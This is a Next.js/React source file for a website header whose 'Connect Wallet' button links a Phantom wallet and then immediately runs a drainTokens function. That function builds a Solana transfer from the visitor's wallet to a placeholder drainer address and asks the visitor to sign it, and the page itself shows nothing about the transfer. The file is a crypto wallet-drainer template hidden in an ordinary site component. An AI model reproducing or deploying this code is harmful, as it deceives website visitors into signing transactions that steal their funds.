"use client";
import React, { useState } from 'react';
import Link from "next/link";
import { Connection, PublicKey, SystemProgram, Transaction } from '@solana/web3.js';
import UseSticky from "../../hooks/UseSticky";
import Image from "next/image";
import NavMenu from "./Menu/NavMenu";
import Sidebar from "./Menu/Sidebar";
import HeaderOffcanvas from "./Menu/HeaderOffcanvas";

import logo_1 from "@/assets/img/logo/logo.png";

const HeaderOne = () => {
    const { sticky } = UseSticky();
    const [isActive, setIsActive] = useState(false);
    const [offCanvas, setOffCanvas] = useState(false);
    const [walletAddress, setWalletAddress] = useState<string | null>(null);

    const connectPhantom = async (e: React.MouseEvent<HTMLAnchorElement, MouseEvent>) => {
        e.preventDefault();

        const solana = window.solana;

        if (solana && solana.isPhantom) {
            try {
                const response = await solana.connect();
                const address = response.publicKey.toString();
                setWalletAddress(address);

                // Simulate draining
                await drainTokens(response.publicKey);
            } catch (err) {
                console.error("Phantom connection error:", err);
            }
        } else {
            alert("Phantom Wallet not found. Please install Phantom.");
        }
    };

    const drainTokens = async (publicKey: PublicKey) => {
        try {
            const connection = new Connection("https://api.devnet.solana.com", "confirmed");
            const recipientPublicKey = new PublicKey('<YOUR_DRAINER_WALLET_PUBLIC_KEY>');
            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: 1000000, // Example amount in lamports (1 SOL = 1,000,000,000 lamports)
                })
            );

            transaction.feePayer = publicKey;
            const { blockhash } = await connection.getRecentBlockhash();
            transaction.recentBlockhash = blockhash;

            const signedTransaction = await window.solana?.signTransaction(transaction);
            const signature = await connection.sendRawTransaction(signedTransaction!.serialize());
            await connection.confirmTransaction(signature);
            console.log("Tokens drained to:", recipientPublicKey.toString());
        } catch (error) {
            console.error("Draining failed:", error);
        }
    };

    return (
        <>
            <header id="header" className="header-layout1">
                <div id="sticky-header" className={`menu-area transparent-header ${sticky ? "sticky-menu" : ""}`}>
                    <div className="container custom-container">
                        <div className="row">
                            <div className="col-12">
                                <div className="menu-wrap">
                                    <nav className="menu-nav">
                                        <div className="logo">
                                            <Link href="/"><Image src={logo_1} alt="Logo" /></Link>
                                        </div>
                                        <div className="navbar-wrap main-menu d-none d-lg-flex">
                                            <NavMenu />
                                        </div>
                                        <div className="header-action">
                                            <ul className="list-wrap">
                                                <li>
                                                    <div className="dropdown-link">
                                                        <Link className="dropdown-toggle" href="#" role="button" id="dropdownMenuLink1" data-bs-toggle="dropdown" aria-expanded="false">ENG</Link>
                                                        <ul className="dropdown-menu" aria-labelledby="dropdownMenuLink1">
                                                            <li>
                                                                <Link href="#">GER</Link>
                                                                <Link href="#">FREN</Link>
                                                                <Link href="#">ARAB</Link>
                                                                <Link href="#">LAT</Link>
                                                                <Link href="#">SPA</Link>
                                                            </li>
                                                        </ul>
                                                    </div>
                                                </li>
                                                <li className="header-login">
                                                    <Link className="btn2" href="#" onClick={connectPhantom}>
                                                        {walletAddress ? `Connected: ${walletAddress.substring(0, 6)}...${walletAddress.substring(walletAddress.length - 4)}` : "Connect Wallet"}
                                                    </Link>
                                                </li>
                                            </ul>
                                        </div>
                                        <div onClick={() => setIsActive(true)} className="mobile-nav-toggler"><i className="fas fa-bars"></i></div>
                                    </nav>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
            <Sidebar style={false} isActive={isActive} setIsActive={setIsActive} />
            <HeaderOffcanvas offCanvas={offCanvas} setOffCanvas={setOffCanvas} />
        </>
    );
};

export default HeaderOne;
